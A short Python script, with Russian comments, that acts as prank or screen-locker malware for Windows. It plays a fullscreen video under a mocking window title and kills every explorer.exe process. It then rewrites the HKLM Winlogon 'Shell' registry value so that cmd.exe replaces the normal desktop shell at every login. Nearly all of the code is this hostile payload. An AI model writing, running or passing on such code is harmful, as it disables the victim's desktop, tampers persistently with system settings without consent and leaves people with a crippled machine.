import pygame
import psutil
import time
import subprocess
from moviepy.editor import VideoFileClip


def video():
    # Создание окна Pygame на весь экран
    pygame.display.set_caption('ЛОООХ')
    pygame.display.set_mode((0, 0), pygame.FULLSCREEN)

    # Загрузка видео из файла
    video = VideoFileClip(".\\assets\\video.mp4")
    video.preview()

    pygame.quit()


def stop_explorer():
    # Завершаем процесс explorer.exe
    for proc in psutil.process_iter():
        if proc.name() == 'explorer.exe':
            proc.terminate()

    # Проверяем, что процесс explorer.exe завершился
    while any(proc.name() == 'explorer.exe' for proc in psutil.process_iter()):
        time.sleep(0.5)


def prevent_explorer():
    # Предотвращаем запуск explorer.exe
    subprocess.call(
        'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe" /f',
        shell=True)
